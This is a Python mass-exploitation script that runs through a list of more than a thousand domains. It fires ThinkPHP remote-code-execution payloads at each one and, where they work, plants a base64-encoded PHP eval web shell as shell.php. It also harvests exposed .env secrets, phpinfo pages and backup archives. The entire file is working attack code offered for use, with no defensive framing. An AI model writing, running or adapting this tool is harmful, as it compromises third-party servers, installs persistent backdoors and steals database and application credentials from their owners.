#!/usr/bin/env python3
"""1114域名全量攻击"""
import subprocess, re, json, time

TARGETS = open("/tmp/attack_list.txt").read().splitlines()
HITS = []

def curl(url, timeout=8, data=None):
    cmd = ["curl", "-skL", "--connect-timeout", "5", "--max-time", str(timeout),
           "-D", "/tmp/mh.txt", "-o", "/tmp/mb.txt"]
    if data: cmd += ["-X", "POST", "-d", data]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        with open("/tmp/mh.txt") as f: hdrs = f.read()
        with open("/tmp/mb.txt") as f: body = f.read(3000)
        code = hdrs.split("\n")[0].split()[1] if hdrs else "000"
        return code, body, hdrs
    except:
        return "000", "", ""

def attack(d):
    result = {"domain": d, "hits": []}
    base = "http://" + d
    code, body, hdrs = curl(base + "/")
    if code in ("000", ""): return result

    # ThinkPHP RCE GET
    for poc in [
        "s=captcha&_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=id",
        "s=index/think/Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
    ]:
        c, b, _ = curl(base + "/index.php?" + poc, timeout=6)
        if "uid=" in b:
            result["hits"].append({"type": "ThinkPHP_RCE_GET"})
            shell = "echo PD9waHAgQGV2YWwoJF9QT1NUW2NdKTs/Pg==|base64 -d > shell.php"
            curl(base + "/index.php?s=captcha&_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=" + shell)
            c2, _, _ = curl(base + "/shell.php")
            if c2 == "200":
                result["hits"].append({"type": "SHELL_OK", "url": base + "/shell.php"})
            break

    # ThinkPHP RCE POST
    c, b, _ = curl(base + "/index.php?s=captcha", timeout=6,
                   data="_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id")
    if "uid=" in b:
        result["hits"].append({"type": "ThinkPHP_RCE_POST"})

    # .env leak (real check)
    c, b, _ = curl(base + "/.env", timeout=5)
    if c == "200" and len(b) > 30 and re.search(r"DB_|APP_KEY|MAIL_", b):
        result["hits"].append({"type": "env_leak", "evidence": b[:300]})

    # phpinfo
    c, b, _ = curl(base + "/phpinfo.php", timeout=5)
    if c == "200" and "PHP Version" in b:
        result["hits"].append({"type": "phpinfo"})

    # backup files
    for f in ["/backup.zip", "/backup.sql", "/www.zip"]:
        c, _, _ = curl(base + f, timeout=8)
        if c == "200":
            result["hits"].append({"type": "backup", "file": f})

    return result

print("Attacking " + str(len(TARGETS)) + " domains...")
for i, d in enumerate(TARGETS):
    d = d.strip()
    if not d: continue
    r = attack(d)
    if r["hits"]:
        HITS.append(r)
        print("[" + str(i) + "] " + d + ": " + str([h["type"] for h in r["hits"]]))
    if i % 200 == 0:
        print("  Progress: " + str(i) + "/" + str(len(TARGETS)) + " (" + str(len(HITS)) + " hits)")

with open("/tmp/mass_results.json", "w") as f:
    json.dump(HITS, f, indent=2, ensure_ascii=False)

print("\n=== DONE: " + str(len(HITS)) + " hits ===")
for h in HITS[:30]:
    print("  " + h["domain"] + ": " + str([x["type"] for x in h["hits"]]))
